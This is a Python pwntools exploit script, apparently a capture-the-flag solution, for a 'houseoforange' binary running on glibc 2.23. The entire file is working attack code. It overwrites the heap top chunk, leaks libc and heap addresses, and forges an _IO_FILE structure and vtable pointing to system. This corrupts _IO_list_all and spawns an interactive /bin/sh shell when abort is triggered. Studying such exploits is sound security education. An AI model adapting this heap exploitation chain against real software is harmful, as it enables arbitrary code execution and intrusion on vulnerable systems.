#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

io = process(['./houseoforange'], env={'LD_PRELOAD':'./libc-2.23.so'})
libc = ELF('libc-2.23.so')

def build(size, name):
    io.sendlineafter("Your choice : ", '1')
    io.sendlineafter("Length of name :", str(size))
    io.sendlineafter("Name :", name)
    io.sendlineafter("Price of Orange:", '1')
    io.sendlineafter("Color of Orange:", '1')

def see():
    io.sendlineafter("Your choice : ", '2')
    data = io.recvuntil('\nPrice', drop=True)[-6:].ljust(8, '\x00')

    return data

def upgrade(size, name):
    io.sendlineafter("Your choice : ", '3')
    io.sendlineafter("Length of name :", str(size))
    io.sendlineafter("Name:", name)
    io.sendlineafter("Price of Orange:", '1')
    io.sendlineafter("Color of Orange:", '1')

def overwrite_top():
    build(0x10, 'AAAA')

    payload  = "A" * 0x30
    payload += p64(0) + p64(0xfa1)      # top chunk header
    upgrade(0x41, payload)

def leak_libc():
    global libc_base

    build(0x1000, 'AAAA')               # _int_free in sysmalloc

    build(0x400, 'A' * 7)               # large chunk
    libc_base = u64(see()) - 0x3c4188   # fd pointer

    log.info("libc_base address: 0x%x" % libc_base)

def leak_heap():
    global heap_addr

    upgrade(0x10, 'A' * 15)
    heap_addr = u64(see()) - 0xc0       # fd_nextsize pointer

    log.info("heap address: 0x%x" % heap_addr)

def house_of_orange():
    io_list_all = libc_base + libc.symbols['_IO_list_all']
    system_addr = libc_base + libc.symbols['system']
    vtable_addr = heap_addr + 0x5c8

    log.info("_IO_list_all address: 0x%x" % io_list_all)
    log.info("system address: 0x%x" % system_addr)
    log.info("vtable address: 0x%x" % vtable_addr)

    stream  = "/bin/sh\x00" + p64(0x60)         # fake header   # fp
    stream += p64(0) + p64(io_list_all - 0x10)  # fake bk pointer
    stream  = stream.ljust(0xa0, '\x00')
    stream += p64(heap_addr + 0x5b8)            # fp->_wide_data
    stream  = stream.ljust(0xc0, '\x00')
    stream += p64(1)                            # fp->_mode

    payload  = "A" * 0x420
    payload += stream
    payload += p64(0) * 2
    payload += p64(vtable_addr)             # _IO_FILE_plus->vtable
    payload += p64(1)                       # fp->_wide_data->_IO_write_base
    payload += p64(2)                       # fp->_wide_data->_IO_write_ptr
    payload += p64(system_addr)             # vtable __overflow

    upgrade(0x600, payload)

def pwn():
    io.sendlineafter("Your choice : ", '1') # abort routine
    io.interactive()

if __name__ == '__main__':
    overwrite_top()
    leak_libc()
    leak_heap()
    house_of_orange()
    pwn()
